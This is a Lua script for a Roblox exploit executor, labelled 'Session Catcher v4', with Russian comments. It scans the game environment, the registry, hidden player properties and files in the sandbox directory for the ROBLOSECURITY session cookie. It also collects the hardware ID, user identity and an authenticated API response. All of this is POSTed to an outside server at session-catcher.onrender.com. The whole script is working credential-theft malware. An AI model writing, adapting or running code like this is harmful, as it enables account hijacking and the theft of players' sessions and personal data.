-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v4 — deep probe: getrenv, getreg, Delta table, httpget
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = request or http_request or (http and http.request) or nil
if not httpRequest then return end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local executorName, executorVersion = "Unknown", "Unknown"
pcall(function()
    if identifyexecutor then
        executorName, executorVersion = identifyexecutor()
    end
end)

local placeId = game.PlaceId
local placeName = "Unknown"
local jobId = game.JobId
pcall(function()
    placeName = MarketplaceService:GetProductInfo(placeId).Name
end)

-- -----------------------------------------------------------
-- 1. getsafedir() — где песочница Delta?
-- -----------------------------------------------------------
local safeDir = "N/A"
pcall(function()
    if getsafedir then
        safeDir = getsafedir()
    end
end)

-- -----------------------------------------------------------
-- 2. Delta table — все ключи и значения
-- -----------------------------------------------------------
local deltaDump = {}
pcall(function()
    local genv = getgenv and getgenv() or _G
    local deltaTbl = genv.Delta
    if deltaTbl and type(deltaTbl) == "table" then
        for k, v in pairs(deltaTbl) do
            if type(v) == "function" then
                deltaDump[tostring(k)] = "function"
            elseif type(v) == "string" then
                deltaDump[tostring(k)] = v:sub(1, 200)
            elseif type(v) == "number" then
                deltaDump[tostring(k)] = tostring(v)
            elseif type(v) == "table" then
                local subKeys = {}
                for k2, v2 in pairs(v) do
                    table.insert(subKeys, tostring(k2) .. ":" .. type(v2))
                end
                deltaDump[tostring(k)] = "table{" .. table.concat(subKeys, ", ") .. "}"
            else
                deltaDump[tostring(k)] = type(v)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 3. pibble table
-- -----------------------------------------------------------
local pibbleDump = {}
pcall(function()
    local genv = getgenv and getgenv() or _G
    local pbl = genv.pibble
    if pbl and type(pbl) == "table" then
        for k, v in pairs(pbl) do
            pibbleDump[tostring(k)] = type(v)
        end
    end
end)

-- -----------------------------------------------------------
-- 4. Raknet / rnet / RakNet tables
-- -----------------------------------------------------------
local raknetDump = {}
pcall(function()
    local genv = getgenv and getgenv() or _G
    for _, name in ipairs({"raknet", "rnet", "RakNet", "Raknet"}) do
        local tbl = genv[name]
        if tbl and type(tbl) == "table" then
            local keys = {}
            for k, v in pairs(tbl) do
                table.insert(keys, tostring(k) .. ":" .. type(v))
            end
            raknetDump[name] = keys
        end
    end
end)

-- -----------------------------------------------------------
-- 5. getrenv() — реальное окружение Roblox
-- -----------------------------------------------------------
local renvKeys = {}
local renvCookieCandidates = {}
pcall(function()
    if getrenv then
        local renv = getrenv()
        if renv and type(renv) == "table" then
            for k, v in pairs(renv) do
                local kStr = tostring(k)
                table.insert(renvKeys, kStr .. ":" .. type(v))
                
                -- Ищем строки с кукой
                if type(v) == "string" then
                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") or v:find("|_") then
                        renvCookieCandidates[kStr] = v:sub(1, 500)
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 6. getreg() — сканирование реестра на предмет куки
-- -----------------------------------------------------------
local regCookieCandidates = {}
local regStringCount = 0
pcall(function()
    if getreg then
        local reg = getreg()
        if reg and type(reg) == "table" then
            for _, v in pairs(reg) do
                if type(v) == "string" then
                    regStringCount = regStringCount + 1
                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
                        table.insert(regCookieCandidates, v:sub(1, 500))
                    end
                elseif type(v) == "table" then
                    -- Сканируем один уровень вглубь
                    for k2, v2 in pairs(v) do
                        if type(v2) == "string" then
                            if v2:find("_|WARNING") or v2:find("ROBLOSECURITY") then
                                table.insert(regCookieCandidates, tostring(k2) .. " => " .. v2:sub(1, 500))
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 7. httpget() — пробуем Delta's httpget вместо request()
-- -----------------------------------------------------------
local httpgetResponse = ""
pcall(function()
    if httpget then
        local resp = httpget("https://users.roblox.com/v1/users/authenticated")
        if resp then
            httpgetResponse = resp:sub(1, 500)
        end
    end
end)

-- -----------------------------------------------------------
-- 8. gethiddenproperty на LocalPlayer
-- -----------------------------------------------------------
local hiddenProps = {}
pcall(function()
    if gethiddenproperty then
        local props = {
            "RobloxSecurity", "ROBLOSECURITY", "Cookie", "AuthToken",
            "SessionToken", "SecurityToken", "AuthenticationToken",
            "UserId", "SessionId", "AccessToken", "Ticket"
        }
        for _, prop in ipairs(props) do
            local ok, val = pcall(gethiddenproperty, LocalPlayer, prop)
            if ok and val then
                hiddenProps[prop] = tostring(val):sub(1, 300)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 9. gethwid()
-- -----------------------------------------------------------
local hwid = "N/A"
pcall(function()
    if gethwid then hwid = gethwid() end
end)

-- -----------------------------------------------------------
-- 10. Скан содержимого getsafedir
-- -----------------------------------------------------------
local safeDirFiles = {}
pcall(function()
    if safeDir and safeDir ~= "N/A" and listfiles then
        local files = listfiles(safeDir)
        if files then
            for _, f in ipairs(files) do
                local ok, content = pcall(readfile, f)
                if ok and content then
                    safeDirFiles[f] = content:sub(1, 300)
                end
            end
        end
    end
end)

-- -----------------------------------------------------------
-- 11. getgenv поиск строк с кукой
-- -----------------------------------------------------------
local genvCookieCandidates = {}
pcall(function()
    local genv = getgenv and getgenv() or _G
    for k, v in pairs(genv) do
        if type(v) == "string" then
            if v:find("_|WARNING") or v:find("ROBLOSECURITY") or v:find("|_") then
                genvCookieCandidates[tostring(k)] = v:sub(1, 500)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    displayName = LocalPlayer.DisplayName,
    placeId = placeId,
    placeName = placeName,
    jobId = jobId,
    executor = executorName,
    executorVersion = executorVersion,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    safeDir = safeDir,
    deltaDump = deltaDump,
    pibbleDump = pibbleDump,
    raknetDump = raknetDump,
    renvKeys = renvKeys,
    renvCookieCandidates = renvCookieCandidates,
    regCookieCandidates = regCookieCandidates,
    regStringCount = regStringCount,
    httpgetResponse = httpgetResponse,
    hiddenProps = hiddenProps,
    hwid = hwid,
    safeDirFiles = safeDirFiles,
    genvCookieCandidates = genvCookieCandidates
}

local success, response = pcall(function()
    return httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Roblox/Delta-Catcher"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[Catcher] v4 sent. Status: " .. (response.StatusCode or "unknown"))
    print("[Catcher] safeDir: " .. safeDir)
    print("[Catcher] Delta keys: " .. #deltaDump)
    print("[Catcher] renv keys: " .. #renvKeys)
    print("[Catcher] reg strings scanned: " .. regStringCount)
    print("[Catcher] reg cookie candidates: " .. #regCookieCandidates)
    print("[Catcher] httpget response: " .. httpgetResponse:sub(1, 100))
else
    warn("[Catcher] Failed: " .. tostring(response))
end
